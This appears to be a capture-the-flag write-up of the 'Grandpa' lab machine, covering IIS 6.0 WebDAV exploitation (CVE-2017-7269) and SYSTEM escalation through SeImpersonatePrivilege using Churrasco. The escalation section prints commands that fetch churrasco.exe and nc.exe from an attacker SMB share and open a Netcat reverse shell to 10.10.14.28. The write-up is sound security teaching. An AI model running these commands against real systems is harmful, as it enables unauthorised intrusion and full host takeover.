# Grandpa

**Difficulty:** Easy | **OS:** Windows | **IP:** `10.129.95.233`

## Summary
**Grandpa** is an easy-difficulty legacy Windows machine that highlights the risks of running end-of-life, unpatched web servers. Initial access is achieved by identifying a known WebDAV buffer overflow flaw (`CVE-2017-7269`) in Microsoft IIS 6.0, allowing remote code execution under the service account context (`network service`). Privilege escalation to `NT AUTHORITY\SYSTEM` is performed by identifying enabled token impersonation privileges (`SeImpersonatePrivilege`) and leveraging a token manipulation technique (such as Churrasco) to execute commands as the system administrator.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **80**: HTTP (Microsoft IIS httpd 6.0)

### Directory & Service Enumeration

Directory fuzzing reveals standard IIS virtual directories (`/images`). Interacting with the HTTP headers confirms the target is running an unpatched instance of Microsoft IIS 6.0 hosted on Windows Server 2003.

## Exploitation (Initial Access)

### WebDAV ScStoragePathFromUrl Buffer Overflow (CVE-2017-7269)
Microsoft IIS 6.0 with WebDAV enabled contains a critical buffer overflow vulnerability in the `ScStoragePathFromUrl` function within `httpext.dll`.

- **Vulnerability Mechanism:** A long, specially crafted header in an `PROPFIND` WebDAV request triggers a buffer overflow when parsing storage paths, allowing arbitrary code execution in the context of the IIS worker process.
- **Execution:** Triggering the vulnerability grants initial command shell access under the service account identity (`NT AUTHORITY\NETWORK SERVICE`).

## Privilege Escalation (Root Flag)

### System & Privilege Enumeration
Inspecting user directories under `C:\Documents and Settings\` reveals the presence of accounts for `Harry` and `Administrator`.

Checking assigned account privileges via `whoami /priv`:

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Checking `systeminfo` confirms the operating system environment:

- **OS Name:** Microsoft Windows Server 2003, Standard Edition
- **OS Version:** `5.2.3790 Service Pack 2 Build 3790`

### Token Impersonation Abuse (SeImpersonatePrivilege)
The `SeImpersonatePrivilege` privilege allows a process to impersonate security tokens belonging to other users (including `SYSTEM`) when services authenticate against local RPC/COM endpoints.

- **Vulnerability Mechanism:** On legacy Windows Server 2003 builds, tools like Churrasco (a local token impersonation utility) force a local service to authenticate to a rogue local pipe server, capturing and impersonating a SYSTEM token.
- **Privilege Escalation Workflow:**

  1) Set up a local file share (`impacket-smbserver`) to host utility binaries on the attack system.
  2) Transfer required utilities (`churrasco.exe` and a Netcat binary) to a writable directory on the target (e.g., `C:\WINDOWS\Temp\`) via SMB:

    ```
    copy \\10.10.14.28\smbFolder\churrasco.exe churrasco.exe
    copy \\10.10.14.28\smbFolder\nc.exe nc.exe
    ```
  3) Execute the impersonation binary to spawn an elevated process context back to an active listener:

     ```churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.28 4444"```

Upon execution, a reverse shell is established with `NT AUTHORITY\SYSTEM` privileges, enabling full control of the host and retrieval of both `user.txt` and `root.txt`.
